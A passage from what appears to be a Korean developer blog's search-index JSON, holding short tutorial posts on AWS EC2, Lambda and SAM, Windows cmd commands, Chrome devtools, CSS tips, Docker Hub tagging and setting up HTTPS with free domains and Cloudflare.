directoriesnode_modules/jspm_packages/# TypeScript v1 declaration filestypings/# TypeScript cache*.tsbuildinfo# Optional npm cache directory.npm# Optional eslint cache.eslintcache# Microbundle cache.rpt2_cache/.rts2_cache_cjs/.rts2_cache_es/.rts2_cache_umd/# Optional REPL history.node_repl_history# Output of 'npm pack'*.tgz# Yarn Integrity file.yarn-integrity# dotenv environment variables file.env.env.test# parcel-bundler cache (https://parceljs.org/).cache# Next.js build output.next# Nuxt.js build / generate output.nuxtdist# Gatsby files.cache/# Comment in the public line in if your project uses Gatsby and not Next.js# https://nextjs.org/blog/next-9-1#public-directory-support# public# vuepress build output.vuepress/dist# Serverless directories.serverless/# FuseBox cache.fusebox/# DynamoDB Local files.dynamodb/# TernJS port file.tern-port# Stores VSCode versions used for testing VSCode extensions.vscode-test# End of https://www.toptal.com/developers/gitignore/api/node .gitignore 파일을 만든다. node프로젝트용 무시목록이다. 깃허브에 저장소를 만들고 푸쉬한다. 저장소 &gt; 세팅 master, docs 선택하고 save버튼을 누른다. 생성된 링크를 클릭해서 잘 동작하는지 확인한다. 여기까지 소스코드","link":"/2020/09/24/TypeDoc-%EC%8B%9C%EC%9E%91%ED%95%98%EA%B8%B0/"},{"title":"a tag no color","text":"no color no color1234567a { color: inherit;}a:hover { color: blue;} a tag는 보통 파란색으로 표시되고, 해당링크에 방문한적이 있으면 색이 달라진다. 아이콘 같은 곳에 링크를 걸었을때 이러한 특징으로 인해 약간 보기싫어지는 경우가 있는데 이를 해결할 수 있다. no underlineno underline123a { text-decoration: none;}","link":"/2020/10/08/a-tag-no-color/"},{"title":"about 페이지 만드는 방법","text":"기본적으로 about 페이지가 없다! 근데 상단 네비게이션바에는 About 링크가 있다! About 페이지가 필요없으면 상단 네비게이션바에서 링크를 없애도 되는데, 나는 만들어 보았다. 만드는 법hexo new page &quot;about&quot; 위 명령을 치면 source/about/index.md 이 자동생성된다. index.md를 열고 열심히 수정하면 끝","link":"/2020/09/17/about-%ED%8E%98%EC%9D%B4%EC%A7%80-%EB%A7%8C%EB%93%9C%EB%8A%94-%EB%B0%A9%EB%B2%95/"},{"title":"awesome button css","text":"Button With Awesome Hover Effects using Html CSS &amp; jQuery | mouseenter and mouseout events 위 영상을 보고 따라 만들었다. 영상에서는 제이쿼리를 사용해서 구현하지만, 나는 제이쿼리없이 구현해보았다. 결과 참고 ; 소스코드","link":"/2020/11/02/awesome-button-css/"},{"title":"aws ec2 docker 설치","text":"docker 실행 명령어 sudo service docker start// docker 실행 참고 https://docs.aws.amazon.com/ko_kr/AmazonECS/latest/developerguide/docker-basics.html","link":"/2020/10/16/aws-ec2-docker/"},{"title":"윈도우에서 aws ec2 keypair 설정","text":"윈도우 10에서 aws ec2를 리모트할 때 .pem파일의 권한을 아무나 볼 수 없게 설정해줘야 한다. 관리자만 볼 수 있도록 설정해야 리모트를 할 수 있다. 속성 &gt; 보안탭 &gt; 고급 &gt; 상속사용안함 &gt; 명시적 사용 권한 &gt; SYSTEM, Administrators 남기고 다 삭제 &gt; 확인 &gt; 확인 SYSTEM, Administrators만 남은걸 확인한다","link":"/2020/10/26/aws-ec2-keypair-%EC%84%A4%EC%A0%95/"},{"title":"aws lambda cors 설정","text":"cors를 통해 도메인이 다른 서버로 요청을 보내고 결과를 받아 올 수 있다. 람다를 웹에서 실행할 수 있다. API 게이트웨이 설정 람다를 실행하는 API를 하나 생성한다. 기본으로 생성되는 any method는 삭제하고 get 메서드를 하나 만들고, 내 람다함수를 붙여준다. 작업 &gt; CORS 활성화 를 클릭한다. Access-Control-Allow-Origin 부분에 내가 원하는 origin을 설정한다. 여기서는 하나의 도메인만 설정할 수 있다. 여러개의 허용 도메인 허용하도록하려면 람다에서 로직을 짜야한다. 위처럼 options 메서드가 추가되고, get 메서드에 응답헤더가 추가된다. 설정이 완료되면 배포를 해야 적용이 된다. CORS Cross-origin resource sharing 참고하면 좋은 13 - API Gateway CORS Cross Origin Resource Sharing (CORS) - Explained with Example &amp; Demo | API Gateway &amp; Lambda CORS(Cross-Origin Resource Sharing)이 나오게 된 배경 이야기 교차 출처 리소스 공유","link":"/2020/11/23/aws-lambda-cors-%EC%84%A4%EC%A0%95/"},{"title":"aws sam, lambda 정리","text":"nodejs 람다 기준 sam sam cli로 로컬에서 람다를 작성하고 배포할 수 있다 실행환경 /var/task 에서 람다 함수가 실행된다 /opt/nodejs 에 레이어가 적재된다 /tmp 디렉터리는 유일한 쓰기 디렉터리이다 /tmp 디렉터리의 용량은 512MB이다 /tmp 디렉터리는 일회성이다 로컬에서 테스트 sam local start-api로 로컬에서 람다를 테스트해볼 수 있다 --skip-pull-image 옵션을 주어 실행 시간을 단축시킬 수 있다 로컬에서 실행할 때 도커가 필요하다 참고로 람다는 아마존 리눅스 2 환경에서 돌아간다 빌드 sam build 명령으로 설치되는 패키지에는 devDependencies가 포함되지 않는다 레이어 레이어는 종속성을 따로 관리할 수 있게 해 준다 노드 모듈은 웬만하면 레이어로 빼는 게 맞는 것 같다 람다 노드 모듈 폴더를 포함하여 배포되면 용량이 커져서 브라우저에서 코드 조회를 할 수 없다 공통적으로 자주 사용되는 패키지들을 묶어서 재사용할 수 있다 레이어로 사용할 devDependencies가 포함되건 말건 상관없다면 심볼릭 링크를 사용하는 것도 나쁘지 않은 것 같다 참고 레이어 (내가 만든 모듈) 내가 제작한 모듈도 레이어로 뺄 수 있다 sam project 루트 디렉터리를 기준으로 /opt/nodejs 에 내 모듈을 작성한다 (ex. /opt/nodejs/myModule.js) sam project 루트 디렉터리에서 jsconfig.json를 다음과 같이 한다 (없으면 생성) jsconfig.json123456789{ &quot;compilerOptions&quot;: { &quot;baseUrl&quot;: &quot;.&quot;, &quot;paths&quot;: { &quot;*&quot;: [&quot;./opt/nodejs/*&quot;] } }, &quot;exclude&quot;: [&quot;node_modules&quot;, &quot;build&quot;]} 이를 임포트 해서 사용하는 파일에서는 app.js1const myModule = require(&quot;myModule&quot;); 이런 식으로 불러와 사용할 수 있다. 자동 완성도 잘 작동한다 레이어 yaml 설정tmplate.yaml1234567891011121314151617181920212223242526272829303132333435363738Resources: HelloWorldFunction: Type: AWS::Serverless::Function # More info about Function Resource: https://github.com/awslabs/serverless-application-model/blob/master/versions/2016-10-31.md#awsserverlessfunction Properties: CodeUri: functions/hello-world/ Handler: app.lambdaHandler Runtime: nodejs12.x Layers: - !Ref MyModuleLayer - !Ref HelloWorldFunctionLayer Events: HelloWorld: Type: Api # More info about API Event Source: https://github.com/awslabs/serverless-application-model/blob/master/versions/2016-10-31.md#api Properties: Path: /hello Method: get # ... HelloWorldFunctionLayer: Type: AWS::Serverless::LayerVersion Properties: LayerName: HelloWorldFunctionLayer Description: Dependencies for SAM ContentUri: layer/HelloWorldFunction CompatibleRuntimes: - nodejs12.x LicenseInfo: &quot;MIT&quot; RetentionPolicy: Retain MyModuleLayer: Type: AWS::Serverless::LayerVersion Properties: LayerName: my-layer Description: Dependencies for SAM ContentUri: opt CompatibleRuntimes: - nodejs12.x LicenseInfo: &quot;MIT&quot; RetentionPolicy: Retain 이런 식으로 리소스에 레이어를 작성한다 참고 https://docs.aws.amazon.com/ko_kr/lambda/latest/dg/best-practices.html https://docs.aws.amazon.com/ko_kr/lambda/latest/dg/gettingstarted-limits.html https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-tools.html","link":"/2021/01/05/aws-sam-%EC%A0%95%EB%A6%AC/"},{"title":"aws 아마존 리눅스2 인스턴스 생성 및 리모트","text":"ec2 인스턴스를 하나 만들고, vscode로 원격접속해보겠다. 따라하기준비물 ec2 keypair vscode ec2 인스턴스 생성하기 예전에는 인스턴스 하나 생성하는 것도 겁이 났었는데, 지금은 옵션 안보고 그냥 기본값으로 생성.. ec2 인스턴스 리모트하기 ssh 클라이언트로 푸티 putty가 대표적이다 근데 나는 푸티는 잘 안쓰고… vscode의 Remote - SSH 확장도구를 사용한다. vscode를 관리자권한으로 실행한다. (열려있는 vscode가 있다면 모두 종료하고 관리자 권한으로 새로 실행한다) Ctrl + Shift + P 를 눌러 커맨드창을 열고 remote를 입력하고, Remete-SSH: Connect to Host... 를 누른다 .ssh\\config12345# Read more about SSH config files: https://linux.die.net/man/5/ssh_configHost ec2-asdf HostName ec2-0-00-000-000.ap-northeast-2.compute.amazonaws.com User ec2-user IdentityFile &quot;C:\\key\\KeyPair.pem&quot; config 파일을 채워줘야하는데, 브라우저로 ec2 인스턴스 화면으로 돌아가서 우클릭 연결을 누른다 위 화면에서 복사를 해서 붙여넣어주면된다. HostName에 ec2-0-00-000-000.ap-northeast-2.compute.amazonaws.com User에 @앞에 있는 유저명을 적어주면된다. 나는 ec2-user가 기본값이 였다 Host에는 그냥 자기가 원하는 식별문자를 적어주면된다. 나는 아무렇게나 ec2-asdf로 했다. IdentityFile에는 키페어 .pem 파일의 경로를 적어주면된다. 절대경로를 사용했다 Ctrl + S 로 저장한다. 참고 : HostNameec2-0-00-000-000.ap-northeast-2.compute.amazonaws.com 이 값은 인스턴스를 중지했다가 다시켜면 바뀐다. 다음번에 접속할 때 탄력적 IP를 사용하는게 아니라면 계속 수정하면서 접속해야한다. Ctrl + Shift + P 를 눌러 커맨드창을 열고 Remote-SSH: Connect to Host를 실행하고 방금 설정한 호스트가 보일 것이다. 클릭한다 그러면 새창이 열린다. 참고 : keypair 권한 관련 오류가 나면 윈도우에서 aws ec2 keypair 설정를 확인한다 123456[14:56:31.053] &gt; @ WARNING: UNPROTECTED PRIVATE KEY FILE! @&gt; @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&gt; Permissions for 'C:\\\\key\\\\KeyPair.pem' are too open.&gt; It is required that your private key files are NOT accessible by others.&gt; This private key will be ignored.&gt; Load key &quot;C:\\\\key\\\\a.pem&quot;: bad permissions 운영체제를 고르라고하는데 당연히 리눅스를 선택한다. 이렇게 vscode로 리모트에 성공했다. 폴더를 열어보자. 나는 홈디렉터리를 열어보겠다. 그러면 창이 리로드 되면서 좌측 탐색기가 업데이트된다. terminal123mkdir a b cls mkdir 로 a,b,c 3개의 디렉터리를 생성한다 그러면 좌측 탐색기도 업데이트되는게 보일 것이다. 끝!","link":"/2020/10/26/aws-%EC%95%84%EB%A7%88%EC%A1%B4-%EB%A6%AC%EB%88%85%EC%8A%A42-%EC%9D%B8%EC%8A%A4%ED%84%B4%EC%8A%A4-%EC%83%9D%EC%84%B1-%EB%B0%8F-%EB%A6%AC%EB%AA%A8%ED%8A%B8/"},{"title":"aws 카테고리 생성","text":"aws 공부한 내용 올리기","link":"/2020/09/18/aws-%EC%B9%B4%ED%85%8C%EA%B3%A0%EB%A6%AC-%EC%83%9D%EC%84%B1/"},{"title":"보일러플레이트, boilerplate","text":"반복되지만 자주쓰이는 형태를 자동화한다는게 보일러플레이트의 핵심이다. create-react-app, create-electron-app 이런 것들을 보일러 플레이트라고 부른다. 참고 보일러 플레이트 [boilerplate] boilerplate code (보일러플레이트 코드)","link":"/2020/11/16/boilerplate/"},{"title":"chrome dev tool, 크롬 개발자 도구, F12","text":"크롬 개발자 도구는 진짜 치트키 특히 이걸 알고시작하면 주먹구구식으로도 뭔가를 만들어낼 수 있다! F12 키로 개발자도구를 켠다 요소선택 개발자도구 상단에보면 네모에 호버하고 있는 마우스 아이콘을 클릭하거나 Ctrl + Shift + C 키로 요소를 선택할 수 있는 모드로 들어갈 수 있다 이 모드가 켜지면 커서있는 곳의 html 요소를 선택할 수 있다. 클릭을하면 개발자도구에 해당 html 요소가 있는 라인이 하일라이트되어 보여지며 원하는 요소를 더블클릭또는 f2를 눌러 html을 수정할 수 있다. 여기서 수정한 내용은 화면에 바로 반영되어 보여진다. 스타일도 적용해볼 수 있으며, 자동완성을 지원해서 속성명을 자세히 몰라도 이것저것 시험해볼 수 있다. 당연하게도 새로고침하면 수정사항이 모두 날라간다. 이렇게 저렇게 브라우저에서 시험삼아해보고 이게 좋다하면 에디터로 돌아와 코드에 추가해서 적용시켜볼 수 있겠다. Copy selector, Copy JS path 나는 이거를 정말 많이쓴다. Copy selector 결과body &gt; section &gt; div &gt; div &gt; div.column.order-2.column-main.is-9-tablet.is-9-desktop.is-9-widescreen &gt; div:nth-child(1) &gt; article &gt; h1 &gt; a 내가 원하는 요소의 셀렉터를 찾아준다. css를 적용하거나, 셀렉터를 쓸필요가있을 때 유용하다. Copy JS path 결과document.querySelector(&quot;body &gt; section &gt; div &gt; div &gt; div.column.order-2.column-main.is-9-tablet.is-9-desktop.is-9-widescreen &gt; div:nth-child(1) &gt; article &gt; h1 &gt; a&quot;) Copy selector와 다른점은 document.querySelector로 감싸준다. debugger 이것도 신기한 기능이다 디버깅하고싶은 소스코드 중간에 debugger라는 키워드를 적어놓으면, 개발자도구가 열렸을 때, 코드가 실행되다가 debugger를 만나면 실행이 멈추고, 해당 위치에서 코드를 한줄씩 실행시켜 볼 수도 있고 그렇다.","link":"/2020/11/12/chrome-dev-tool/"},{"title":"chrome 드래그 앤 드랍 안됨","text":"chrome이 관리자 권한으로 켜져있는지 확인한다. 관리자 권한으로 켜지면 드래그 앤 드랍이 작동하지 않는다. TMI 웹에서 드래그 앤 드랍으로 이미지를 첨부하는 기능을 넣었는데, 이상하게 마우스 커서가 위 처럼 되면서, 동작하지 않았다. 막 chrome://flags 들어가서 설정도 따라해보고, windows 이미지 도구? 도 재설치해보고 삽질을 마구마구하다가. 그냥 관리자 권한으로 chrome이 켜져 있어서 안되었던 문제이다. 이밖에도 chrome이 관리자 권한으로 켜져있으면 안되는 것은, 카톡 등 메신저에서 다른 링크를 켤 때 정도가 있다. chrome이 관리자 권한으로 켜지는 이유는 나는 vscode가 관리자 권한으로 실행되게 해놨다, 그래서 vscode에서 브라우저를 실행시킬 때 관리자권한으로 실행된다.","link":"/2020/12/15/chrome-%EB%93%9C%EB%9E%98%EA%B7%B8-%EC%95%A4-%EB%93%9C%EB%9E%8D-%EC%95%88%EB%90%A8/"},{"title":"chrome inactive tab setTimeout, setInterval 실행 느림","text":"브라우저에서 js 코드 실행속도가 이상하게 느려져서 어떤 문제인가했는데, 개발자도구를 새창으로 열고(콘솔보는용도로) 탭을 백그라운드로 보내버렸더니 생긴문제였다. setTimeout, setInterval 메서드의 경우 탭이 인액티브 상태이면 1초 이상으로 제한된다고 한다. 인액티브 상태는 최소화하는 등 화면에서 사라지는 경우를 말하는 것 같다. 123setInterval(() =&gt; { log(1);}, 100); 위코드를 작성하고 개발자도구 콘솔창을 새창으로 열고 탭을 최소화하면 1초 간격으로 실행되는 것을 확인 할 수 있다. 참고 WindowOrWorkerGlobalScope.setTimeout() - Web APIs | MDN Javascript performance when running in an unfocused tab","link":"/2020/11/13/chrome-inactive-tab-setTimeout-setInterval-%EC%8B%A4%ED%96%89-%EB%8A%90%EB%A6%BC/"},{"title":"cidr","text":"aws에서 보안그룹이라던지, acl 설정이라던지 ip를 받는 설정을 하다보면 123.123.123.123/32 등 ip/mask bits 로 표기되는 것을 본적 있을 것이다. 이를 CIDR 표기법이라고하고, 이는 쉽게 ip의 범위를 나타낸다. 마스크 비트 숫자가 클수록 범위가 좁다. 마스크 비트 숫자가 작을수록 범위가 크다. = 포함된 ip 주소가 많다. 참고 사이더_(네트워킹) CIDR 표기법 How to Convert CIDR Notation value into Subnet Mask | Animation Video","link":"/2020/11/23/cidr/"},{"title":"cmd로 프로세스 죽이기","text":"cmd123taskkill /IM &quot;process name&quot; /Ftaskkill /IM &quot;oCam.exe&quot; /F 나는 주로 정상 종료할 때 광고 뜨는 프로그램을 종료하거나, 한번에 여러 프로그램을 종료하려고 배치파일로 만들어 사용했다. 실행해도 안꺼지는 경우, 관리자 권한이 필요할 수도있다.","link":"/2020/10/19/cmd-kill-process/"},{"title":"cmd 관리자 권한","text":"관리자 권한으로 배치파일을 실행했을때 경로가 바뀌는 것을 해결할 수 있다. pushd “%~dp0”1pushd &quot;%~dp0&quot; 위 명령은 .bat 파일이 있는 경로로 자동 cd해주는 명령이다. 보통 .bat 파일을 만들때 관리자 권한이 필요한 명령이 있을 수 있다. .bat을 기준하여 상대경로로 멋지게 로직을 쫘놨는데.. 관리자 권한으로 실행하면 제멋대로 C:\\WINDOWS\\system32 경로로 실행해버리는 바람에 원하는 결과가 나오지 않는다. 위 명령으로 해결!","link":"/2020/10/06/cmd-%EA%B4%80%EB%A6%AC%EC%9E%90-%EA%B6%8C%ED%95%9C/"},{"title":"cmd 이전 내용 지우기 cls","text":"cmd1cls linux terminal는 clear","link":"/2020/09/21/cmd-%EC%9D%B4%EC%A0%84-%EB%82%B4%EC%9A%A9-%EC%A7%80%EC%9A%B0%EA%B8%B0-cls/"},{"title":"cmd 폴더 삭제 rmdir","text":"cmd12345rmdir /s {디렉터리}rmdir /s folder_namermdir /s folder1_name folder2_name rmdir /s {디렉터리} /s 옵션으로 빈 디렉터리가 아니더라도 삭제할 수 있다. 디렉터리를 나열해서 여러개를 한번에 지울 수 있다 auto yes 지울때 y를 입력해줘야하는데.. cmd123echo y|rmdir /s folder1_nameecho yy|rmdir /s folder1_name folder2_name 이런식으로 사용하면 자동 수락한다 약간 귀찮긴하다.. 그냥 여러 파일, 폴더 삭제는 탐색기 열어서 하는게 빠름..","link":"/2020/10/21/cmd-%ED%8F%B4%EB%8D%94-%EC%82%AD%EC%A0%9C-rmdir/"},{"title":"cmd 폴더 생성","text":"cmd123mkdir new-foldermkdir a\\b\\c mkdir [폴더명]","link":"/2020/09/21/cmd-%ED%8F%B4%EB%8D%94-%EC%83%9D%EC%84%B1/"},{"title":"connection vs connection pool","text":"connection pool를 써보자 Connection pool 기존 connection은 데이터베이스에 동시 접속 허용량을 초과하는 연결을 할 경우 에러 발생 connection pool을 사용하면 대기상태가 되었다가 수행됨 pool 에 여러 미리 생성되어 있는 connection을 가져가 쓴다 connection이 미리 생성되어있기 때문에 생성시간 소모되지 않음. 따라서 속도 빨라짐. 쉽게 다운되지 않음. 참고 Database Tutorial – Single Connection vs Connection Pool [DB]Connection Pool","link":"/2020/11/10/connection-vs-connection-pool/"},{"title":"console.log 축약쓰기, 줄여쓰기, 별명 붙여 쓰기","text":"1234const log = console.log;log(12312313);log('안녕'); console. 쓰는 수고를 덜어준다. log 까지지면 vscode의 경우 console.log(); 자동완성 시켜주는데 가끔 자동완성 우선순위가 첫번째가 아닌경우가 있다 그래서 그냥 별명을 붙여 쓰는게 맘편한 것 같다 clg (코드 스니펫) 오후 3:01 2021-04-28 추가 https://chinsun9.github.io/2020/11/18/vscode-console-log-빨리치기/ vscode 스니펫 익스텐션을 깔면 clg로 쉽게 자동완성 시 킬 수 있다","link":"/2020/11/12/console-log/"},{"title":"cmd에서 새 파일 생성 명령어 copy con","text":"cmd1copy con new_file.txt windows에서 새 파일을 cli로 만들고 싶을 때… copy con new_file.txt를 치면 바로 생성되지 않고 파일의 내용을 입력할 수 있다. Ctrl + Z 키를 눌러 작성을 완료하면 된다. 아무것도 작성하지 않으면 빈 파일을 생성할 수 있다.","link":"/2020/10/14/copy-con-name-txt/"},{"title":"CRLF, LF","text":"LF\\n CRLF = CR + LF\\r\\n 여러줄의 텍스트를 가진 file을 읽고 처리할 때 줄바꿈 형식을 알고 있어야한다. 윈도우의 경우 CRLF이다. vscode에서 쉽게 변환하기 vscode에서는 우측하단에 보면, 인코딩 형식과 줄바꿈 형식을 알려준다. 우측하단을 클릭해서 변환할 수 있다. 또는 ctrl + shift + p 에서 end of line을 검색해서 변환할 수 있다.","link":"/2020/11/09/crlf-lf/"},{"title":"css !important","text":"example123div { color: blue !important;} 무적기… 근데 권장하진 않는다!","link":"/2020/09/18/css-important/"},{"title":"css 선언 순서 정렬하기 prettier-plugin-style-order","text":"css를 조금 더 아름답고 일관되게 작성해보자. 기본 prettier 포맷팅을 사용하면 들여 쓰기를 예쁘게 고쳐준다 그런데 규칙 없이 나열된 속성들을 일관되게 포맷팅을 하고 싶은 욕구가 생겨서 찾아보았다 이런 것들은 직접 하는 것보다는 도구의 도움을 받는 게 훨씬 좋다고 생각한다 prettier-plugin-style-order (참고) 나는 scss로 작업했다 1234yarn add -D prettier-plugin-style-order// postcss-scss 도 인스톨 하라고 메시지가 나옴yarn add -D postcss-scss 이렇게 패키지를 설치하고, fonmat on save 옵션이 켜져 있다면, 아무 css 파일에서 저장을 해보면 순서가 아름답게 정렬되는 것을 알 수 있다. 기존에 작업하던 것들을 일괄적으로 포맷팅 하고 싶다면 npm script에 prettier 명령어로 원하는 경로의 css파일들을 지정해서 일괄 포맷팅 한다. &quot;cssSort&quot;: &quot;prettier --write src/**/*.scss&quot; 생각 이전에는 항상 css를 주먹구구 중에서도 주먹구구로 작성해왔는데, 그러지 않을 수 있겠다. css property order, css property sort 이런 식으로 검색을 했었는데 stylelint 등 여러 가지 css를 정렬하는 도구들이 있는 것 같았다 그런데 prettier을 사용하고 있기 때문에, 다른 거 쓰지 말고 prettier에서 플러그인을 깔아서 해결해 보자 하여 prettier-plugin-style-order를 설치해서 사용해 보았다 참고 https://9elements.com/css-rule-order/ https://github.com/brandon-rhodes/Concentric-CSS/blob/master/style3.css https://css-tricks.com/poll-results-how-do-you-order-your-css-properties/","link":"/2021/01/05/css-%EC%84%A0%EC%96%B8-%EC%88%9C%EC%84%9C-%EC%A0%95%EB%A0%AC%ED%95%98%EA%B8%B0-prettier-plugin-style-order/"},{"title":"denied: requested access to the resource is denied","text":"denied: requested access to the resource is denied docker hub에 내가 연습했던 이미지를 업로드하려고 했는데 실패했다. 이미지명 변경cmd123docker image tag {이미지} {내 유저명}/{이미지}docker image tag my-react:0.0.1 chinsung/my-react:0.0.1 이런식으로 {내 유저명}/을 붙여주면 된다. 음 성공! 참고한 곳 ; [Docker CE] 도커 이미지 업로드 권한 에러 (denied: requested access to the resource is denied)","link":"/2020/10/22/denied-requested-access-to-the-resource-is-denied/"},{"title":"disqus로 블로그 댓글 사용하기","text":"hexo icarus theme 에서는 disqus를 기본으로 지원한다. 우리는 disqus에서 shortname을 알아내서 적어주기만 하면 된다. 너무 간편하다! 따라하기 hexo icarus theme 기준입니다! 스샷아래 설명이 있는데 그냥 스샷 그대로 따라가면 됩니다. DISQUS 회원가입 DISQUS에 회원가입하고 로그인한다. DISQUS에서 사이트 추가(Shortname만들고 확인하기) GET STARTED 버튼 클릭 I want to install Disqus on my site 버튼 클릭 항목 작성 스크롤을 내려서 Basic 선택 스크롤을 내려서 ...with Universal Code 선택 뭐라뭐라 막 나오는데, 다 무시하고 스크롤을 내려서 Configure 버튼 클릭 Website URL 항목만 채우고 Complete Setup 버튼 클릭 하단 Dismiss Setup 버튼을 클릭하고, 상단에 Edit Settings 버튼 클릭 Shortname 항목에서 내 Shortname을 확인하고 복사한다. _config.icarus.yml에 Shortname 설정하기 _config.icarus.yml1234comment: type: disqus # Disqus shortname shortname: 'chinsun9' 이렇게 설정해주면 끝..! 놀랍게도 적용이 완료되었다!","link":"/2020/09/23/disqus%EB%A1%9C-%EB%B8%94%EB%A1%9C%EA%B7%B8-%EB%8C%93%EA%B8%80-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"ec2 web app https 적용하기","text":"웹에서 위치정보를 활용하고 싶어서 geolocation을 사용했는데, geolocation은 localhost 또는 https에서만 동작했다. 위치정보를 활용하는 이 앱을 다른사람들에게 배포하기 위해서는 https를 사용했어야 했다. 삽질을 많이했는데, 어떻게 하는지 정리한다. 할게 쫌 많고, 중간중간 대기시간이 길다. 처음부터 끝까지 무료로 하는 법이다 따라하면 ec2에서 express로 돌아가는 웹앱에 https를 적용할 수 있다. 내가 시도한 환경 aws 프리티어 ec2 (아마존 리눅스 2) 탄력적 IP 주의사항 ; 탄력적 IP는 1개까지 무료다. 탄력적 IP를 사용하면 연결된 ec2 인스턴스를 종료해서는 안된다. 인스턴스는 매월 750시간 무료다. 이 인스턴스를 제외하고 다른 인스턴스를 실행하면 비용이 생길 수 있다. 해야할일 목록… express 웹 앱준비. ec2 보안그룹 인바운드 설정 (http, https, 앱에서 사용하는 포트 열기) ec2에 탄력적 IP 할당 ACM(AWS Certificate Manager)에서 SSL/TLS 인증서 발급요청 freenom에서 도메인 얻기 cloudflare 가입하고 사이트 추가 freenom dns 설정 및 SSL/TLS 인증서 발급 완료 freenom에서 cloudflare로 네임서버 변경 aws 애플리케이션 로드 밸런서 생성 cloudflare dns 설정 따라하기express 웹 앱 준비.terminal123express https-web-app --view=ejscd https-web-appnpm i 간단하게 익스프레스 제너레이터로 웹앱을 생성한다. 새로 생성하거나 기존에 있는 웹앱을 ec2 인스턴스에 올려준다. terminal1export PORT=8080&amp;&amp; node ./bin/www 앱을 실행한다. 나는 익스프레스 제너레이터로 만들었기때문에 process.env.PORT로 8080값을 줘서 8080포트로 앱이 실행되도록하였다. ec2에 탄력적 IP 할당 ec2 &gt; 탄력적 IP 주소 &gt; 탄력적 IP 주소 할당 방금 앱을 실행한 인스턴스를 선택하고 할당해준다. 주의 : 탄력적 IP를 할당한 이상 연결된 EC2가 종료되어 탄력적 IP에 아무것도 연결되어 있지 않으면 비용이 발생한다. 또, 탄력적 IP는 1개까지 무료이다. EC2도 이제부터 매일 돌아가게됨(750시간 무료)으로 사실상 실행할 수 있는 인스턴스는 1개로 제한된다. ec2 보안그룹 인바운드 설정 (http, https, 앱에서 사용하는 포트 열기) 앱이 실행되고있는 ec2 인스턴스 보안그룹으로 들어가 인바운드 규칙을 편집한다. http와 https를 어디서나 접근가능하게 한다. 또 앱을 실행 포트도 어디선 접근가능하게 한다. 나의 경우 8080포트이다. freenom에서 도메인 얻기 내가 도메인을 얻을 때 이사이트가 엄청나게 느리기때문에 많은 인내가 필요하다.. 수시로 404 not found가 뜬다… 새로고침을 몇번했는지 모르곘다. freenom에서 나는 처음 도메인을 얻어봤다. 그런데 여기서 삽질한 것이 당연히 회원가입을 먼저하고 도메인을 얻는 것인줄 알았으나, 도메인을 얻는 과정에서 체크아웃을 하면서 회원가입을 진행해야 정상 진행된다. 원하는 도메인을 입력한다. FREE 라벨이 붙은것중에서 원하는 것을 선택한다. 원하는 도메인을 선택하면, 체크아웃 버튼이 생긴다. 체크아웃버튼을 눌러준다. 기간을 선택하고 Continue버튼을 누른다. 여기서 드디어 회원가입을 진행한다.. 나는 왼쪽 이메일 인증을 선택하였다. 이메일 입력하고 버튼을 누르면, 해당 메일로 인증 url이 날라오는데 클릭해서 다음을 진행한다. 이렇게 회원가입폼이 나오는데 빨간부분을 채워주고 동의체크하고 완료한다. 이렇게 무료로 도메인 얻기에 성공했다. 이제 aws로 돌아와서 무료로 인증서를 발급받아보자. ACM(AWS Certificate Manager)에서 SSL/TLS 인증서 발급요청 ACM(AWS Certificate Manager)에서 인증서 요청 &gt; 공인 인증서 요청 으로 들어간다 도메인 이름을 추가한다. 나는 이 인증서에 다른 이름 추가 버튼을 통해 *.domainname 도 추가해줬다. 검증 방법으로 DNS 검증을 선택한다 다음 검토 화면은 그냥 확인 마지막 단계 검증 화면에서 조금 기다리면 이런 화면이 나온다. 도메인 이름 옆에 펼치기 버튼을 클릭해주면 이름 유형 값이라는 게 나오는데 이 값들을 freenom dns 설정에서 레코드로 추가해줄 것이다. freenom dns 설정 및 SSL/TLS 인증서 발급 완료 freenom 사이트로 돌아와서 로그인하고 상단 메뉴에 Services &gt; My domains 클릭 Manage Domain 버튼을 클릭하고 Manage Freenom DNS를 클릭한다. 위같은 화면이 나오면 아까 ACM에서 봤던 이름과 값들을 채워준다. 주의 : 타입을 CNAME으로 한다. 위와같이 매칭시켜주면된다. 나는 *.domainname으로 추가 이름을 지정해줬는데 이 경우에는 이름과 값이 완전히 똑같기 때문에 한개의 레코드만 설정해주면된다. *이 아니고, www. 같은 이름을 추가한 경우에는 레코드를 하나 더 추가하고 똑같이 매칭시켜서 입력해주면 된다. 저장한다 이제 ACM으로 돌아와서 인증서 상태가 발급 완료로 변할때까지 기다리면서 유튜브 한편을 보고온다. 나는 약 5-10분정도 기다린 것 같다. 만약에 20분이 넘도록 검증 보류 상태라면 뭔가 잘못 따라한 것이다. 이제 DNS 네임서버를 cloudflare로 바꿀 것이다. cloudflare 가입하고 사이트 추가 회원가입한다. 회원가입을 완료하면, 사이트를 추가할 수 있는데, 내 도메인을 입력한다. 다음화면에서 Free를 선택하고 넘어간다 넘어오면 이렇게 스캔하는 화면이 나온다. 스캔이 완료되면 이런화면이 나오는데, 비어있다면, 아까 freenom에서 dns 설정한것처럼 똑같이 타입을 cname으로 하여 이름, 값을 넣어준다. 완료했다면 다음화면을 넘어간다. 그러면 네임 서버를 바꾸라는 말이 나온다. 이제 freenom사이트로 돌아가서 네임서버를 변경해보자. freenom에서 cloudflare로 네임서버 변경 상단 메뉴에 Services &gt; My domains 클릭 Manage Domain 버튼을 클릭하고 Management Tools &gt; Nameservers를 클릭한다. 네임 서버를 변경해준다. 성공하면, cloudflare화면으로 돌아와서 완료를 눌러준다. 이런화면이 나오는데 나는 항상 https 옵션을 켜주고 완료해주었다. 해당 사이트의 개요화면으로 넘어가는데 만약에 이런화면이 나오는데 1~5분정도 기다리면, 이런 화면으로 바뀐다. 이제 aws로 돌아와 로드 밸런서를 생성해줄 것이다. aws 애플리케이션 로드 밸런서 생성 ec2 &gt; 로드 밸런서 &gt; 로드 밸런서 생성 &gt; 애플리케이션 로드 밸런서 생성 이름을 정해주고, 리스너에서 https를 추가해준다. 가용영역 체크하고 다음으로 넘어간다. 발급받은 도메인 인증서를 선택하고 다음으로 넘어간다. ce2 인스턴스가 속해있는 보안그룹을 선택한다. 적당히 이름을 짓고, 포트에서 내 앱이 사용하고있는 포트를 입력하고 다음으로 넘어간다. 내 앱이 실행되고있는 인스턴스를 선택하고 등록된 항목에 추가 버튼을 누른다. 